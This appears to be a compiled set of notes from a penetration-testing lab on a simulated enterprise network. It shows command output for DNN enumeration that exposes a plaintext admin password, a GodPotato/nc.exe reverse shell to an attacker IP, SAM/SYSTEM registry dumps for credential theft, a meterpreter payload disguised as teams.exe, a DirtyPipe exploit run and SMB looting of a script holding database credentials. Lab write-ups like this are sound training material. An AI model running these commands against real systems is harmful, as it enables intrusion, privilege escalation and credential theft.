# Misc Files - Extracted Evidence

Compiled from ACME-IPT engagement notes (Attacking Enterprise Networks vault).

---

### #### **Enumerating 172.16.8.20 - DotNetNuke (DNN)**
_Source: Internal-Testing, line ~552_

```
root@dmz01:/tmp/DEV01# cd DNN
root@dmz01:/tmp/DEV01/DNN# ls

App_LocalResources                CKHtmlEditorProvider.cs  Options.aspx                 Web
Browser                           Constants                Options.aspx.cs              web.config
bundleconfig.json                 Content                  Options.aspx.designer.cs     web.Debug.config
CKEditorOptions.ascx              Controls                 packages.config              web.Deploy.config
CKEditorOptions.ascx.cs           Extensions               Properties                   web.Release.config
CKEditorOptions.ascx.designer.cs  Install                  UrlControl.ascx
CKEditorOptions.ascx.resx         Module                   Utilities
CKFinder                          Objects                  WatchersNET.CKEditor.csproj

root@dmz01:/tmp/DEV01/DNN#
```

---

### #### **Enumerating 172.16.8.20 - DotNetNuke (DNN)**
_Source: Internal-Testing, line ~568_

```
root@dmz01:/tmp/DEV01/DNN# cat web.config 

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
    <value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~632_

```
c:\DotNetNuke\Portals\0\GodPotato-NET4.exe -cmd "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~653_

```
c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE

The operation completed successfully.
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~825_

```
        
subzeroxi11@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 787 bytes
Final size of exe file: 7168 bytes
Saved as: teams.exe

Next, we need to set up a multi/handler and start a listener on a different port than the payload we generated will use.

        shellsession
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> use multi/handler
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 7000
lport => 7000
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started HTTPS reverse handler on https://0.0.0.0:7000

```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~19_

```
upload agent.exe "C:\Department Shares\IT\Networking\agent.exe"
```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~207_

```
ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
ssmallsadm@MGMT01:~$ ./dirtypipe 

Usage: ./dirtypipe SUID
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~155_

```
$ cat 172.16.8.3.json 
{
    "Department Shares": {
        "IT/Private/Development/SQL Express Backup.ps1": {
            "atime_epoch": "2022-06-01 14:34:16",
            "ctime_epoch": "2022-06-01 14:34:16",
            "mtime_epoch": "2022-06-01 14:35:16",
            "size": "3.91 KB"
        }
    },
    "IPC$": {
        "323a2fd620dcf3e3": {
            "atime_epoch": "1600-12-31 19:03:58",
            "ctime_epoch": "1600-12-31 19:03:58",
            "mtime_epoch": "1600-12-31 19:03:58",
            "size": "3 Bytes"
<SNIP>

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~202_

```
    
smb: \IT\Private\> cd Development\
smb: \IT\Private\Development\> ls
  .                                   D        0  Wed Jun  1 14:34:17 2022
  ..                                  D        0  Wed Jun  1 14:34:17 2022
  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022

        10328063 blocks of size 4096. 8177952 blocks available
smb: \IT\Private\Development\> get SQL Express Backup.ps1 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Private\Development\SQL
smb: \IT\Private\Development\> get "SQL Express Backup.ps1" 
getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (8.7 KiloBytes/sec) (average 8.7 KiloBytes/sec)

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~219_

```
        
subzeroxi11@htb[/htb]$ cat SQL\ Express\ Backup.ps1 

$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "<REDACTED>"

$server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)

```
